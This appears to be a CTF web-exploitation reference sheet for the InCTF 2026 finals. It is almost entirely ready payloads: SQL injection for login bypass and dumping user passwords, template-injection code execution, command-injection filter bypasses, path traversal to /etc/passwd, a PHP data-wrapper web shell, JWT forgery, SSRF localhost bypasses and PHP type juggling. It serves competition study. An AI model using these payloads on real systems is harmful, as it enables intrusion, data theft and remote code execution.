# 🌐 CTF WEB EXPLOITATION MASTER BIBLE
### InCTF 2026 Finals — Zero to Hero Reference (Rule 14 Offline Compliant)

---

## 1. SQL Injection (SQLi)

### Quick Authentication Bypass (Login Screens)
```sql
admin' -- -
admin' #
admin'/*
' OR 1=1-- -
' OR '1'='1
admin' or '1'='1'-- -
" OR 1=1-- -
```

### UNION-Based SQLi (Column Count & Extraction)
```sql
-- 1. Find number of columns
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -  (if error on 4, there are 3 columns)

-- 2. Find which column reflects on page
' UNION SELECT 1, 2, 3-- -
' UNION SELECT 'a', 'b', 'c'-- - (if string type required)

-- 3. Extract MySQL / MariaDB Data:
' UNION SELECT 1, version(), user()-- -
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1, group_concat(username, ':', password), 3 FROM users-- -

-- 4. Extract SQLite Data:
' UNION SELECT 1, sqlite_version(), 3-- -
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1, group_concat(id || ':' || flag), 3 FROM secret-- -

-- 5. Extract PostgreSQL Data:
' UNION SELECT null, version(), null-- -
' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema='public'-- -
```

### Blind / Time-Based SQLi
```sql
-- SQLite Blind:
' OR (SELECT unicode(substr(flag,1,1)) FROM secret)=105-- -

-- MySQL Time-based (Sleep 5s if condition is true):
' OR IF(ascii(substr((SELECT flag FROM secret),1,1))=105, SLEEP(5), 0)-- -

-- PostgreSQL Time-based:
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 2. Server-Side Template Injection (SSTI)

### Detection:
Inject `{{7*7}}` or `${7*7}` or `<%= 7*7 %>` -> If response is `49`, SSTI is confirmed!

| Engine | Test Payload | RCE Payload |
|---|---|---|
| **Jinja2 (Python/Flask)** | `{{7*'7'}}` -> `7777777` | `{{config.__class__.__init__.__globals__['os'].popen('cat flag*').read()}}` |
| **Jinja2 (Filter Bypass)** | `{{[].__class__.__base__.__subclasses__()}}` | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| **Twig (PHP)** | `{{7*7}}` -> `49` | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat flag.txt")}}` |
| **EJS / Node.js** | `<%= 7*7 %>` -> `49` | `<%= global.process.mainModule.require('child_process').execSync('cat flag') %>` |
| **Mako (Python)** | `${7*7}` | `<%import os%>${os.popen('cat flag').read()}` |
| **Ruby ERB** | `<%= 7*7 %>` | `<%= \`cat flag\` %>` |

---

## 3. Command Injection & Filter Bypasses

### Basic Chains:
```bash
; cat flag.txt
| cat flag.txt
|| cat flag.txt
& cat flag.txt
&& cat flag.txt
`cat flag.txt`
$(cat flag.txt)
```

### Bypassing WAF / Bad Characters:
```bash
# Bypass Space:
cat${IFS}flag.txt
cat$IFS$9flag.txt
{cat,flag.txt}
X=$'cat\x20flag.txt';$X

# Bypass Keyword "cat" or "flag":
c\a\t f\l\a\g.txt
c""a""t f""l""a""g.txt
more flag.txt / less flag.txt / head flag.txt / tail flag.txt / nl flag.txt / tac flag.txt
base64 flag.txt
grep "{" flag.txt

# Base64 Execution (Bypasses all keyword filters):
echo "Y2F0IGZsYWcudHh0" | base64 -d | sh
echo "cat /flag" | bash
```

---

## 4. Local File Inclusion (LFI) & Path Traversal

```bash
# Path Traversal:
../../../../../../etc/passwd
../../../../../../flag
..%2f..%2f..%2f..%2f..%2fflag (URL Encoded)
....//....//....//flag (Filter bypass for ../)

# PHP Wrappers (Read Source Code in Base64):
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=flag.php

# PHP Data Wrapper (RCE if allow_url_include=On):
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id

# PHP Input Wrapper:
php://input  (Send POST body: <?php system('id'); ?>)
```

---

## 5. JWT (JSON Web Token) Exploits

A JWT consists of `Header.Payload.Signature` (Base64URL encoded).

1. **Algorithm None Attack (`alg: none` / `None` / `NONE`):**
   - Decode Header: Change `"alg": "HS256"` -> `"alg": "none"`
   - Decode Payload: Change `"user": "guest"` -> `"user": "admin"`
   - Re-encode without signature: `Base64(Header).Base64(Payload).` (keep trailing dot!)

2. **Algorithm Confusion (RS256 -> HS256):**
   - If public key is visible on page or `/public.key`, sign the token using HMAC-SHA256 with the public key as the secret!

3. **Crack Weak Secret with Hashcat or John:**
   ```bash
   # John:
   john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt
   ```

---

## 6. SSRF (Server-Side Request Forgery)

### Bypass Localhost Filters:
```bash
http://127.0.0.1:8000/
http://localhost:8000/
http://0.0.0.0:8000/
http://127.1:8000/
http://2130706433:8000/       # Decimal IP of 127.0.0.1
http://0177.0.0.01:8000/      # Octal IP
http://[::1]:8000/            # IPv6 localhost
http://127.0.0.1.nip.io/      # DNS Rebinding (Resolves to 127.0.0.1)
http://localtest.me/
```

---

## 7. PHP Quirks & Type Juggling

```php
// 1. Loose Comparison (==) with Hashes ("0e" magic hashes):
// MD5("240610708") = "0e462097431906509019562988736854" (evaluates to 0)
// MD5("QNKCDZO")    = "0e830400451993494058024219903391" (evaluates to 0)
// "0e..." == "0e..." -> TRUE!

// 2. strcmp() Array Bypass:
// If code does: if (strcmp($_POST['password'], $secret) == 0)
// Send: password[]=anything -> strcmp(Array, String) returns NULL -> NULL == 0 is TRUE!

// 3. md5(Array) returns NULL -> NULL === NULL is TRUE!
```
